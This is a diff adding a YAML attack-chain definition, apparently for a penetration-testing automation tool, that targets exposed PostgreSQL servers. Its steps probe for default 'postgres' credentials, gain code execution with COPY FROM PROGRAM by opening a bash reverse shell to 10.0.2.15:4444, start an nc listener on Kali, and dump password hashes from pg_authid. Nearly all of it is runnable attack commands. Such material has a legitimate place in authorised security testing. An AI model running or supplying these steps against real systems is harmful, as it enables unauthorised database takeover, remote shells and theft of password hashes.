@@ -1,0 +1,43 @@
+chain_id: postgres_open_to_rce
+title: "PostgreSQL — default creds + COPY FROM PROGRAM RCE"
+severity: HIGH
+tags: [postgres, database, default-creds, copy-program, rce]
+
+trigger:
+  any_of:
+    - { port: 5432 }
+    - { service: postgresql }
+    - { service_pattern: "(?i)postgres" }
+
+description: |
+  Open PostgreSQL. Defaults to listening on 5432; defaults often allow
+  `postgres:postgres`, `postgres:'`, or trust on localhost. With superuser
+  access (or any user with pg_execute_server_program), `COPY ... FROM
+  PROGRAM` lets you run shell as the postgres OS user.
+
+steps:
+  - id: 1
+    title: "Default-cred probe"
+    command: |
+      psql -h $VICTIMA -U postgres -W <<<'\\\\l'      # try blank, postgres, admin
+      netexec postgres $VICTIMA -u postgres -p ''
+
+  - id: 2
+    title: "Once authenticated, RCE via COPY FROM PROGRAM"
+    command: |
+      psql -h $VICTIMA -U postgres -d postgres << 'EOF'
+      CREATE TABLE pwn (cmd_output TEXT);
+      COPY pwn FROM PROGRAM 'id; bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"';
+      EOF
+
+  - id: 3
+    title: "Listener on Kali"
+    command: nc -lvnp 4444
+
+  - id: 4
+    title: "Read pg_shadow (or pg_authid >= 13) for hashes if you only have a low-priv account"
+    command: |
+      psql -h $VICTIMA -U USUARIO -W -c 'SELECT rolname, rolpassword FROM pg_authid;'
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
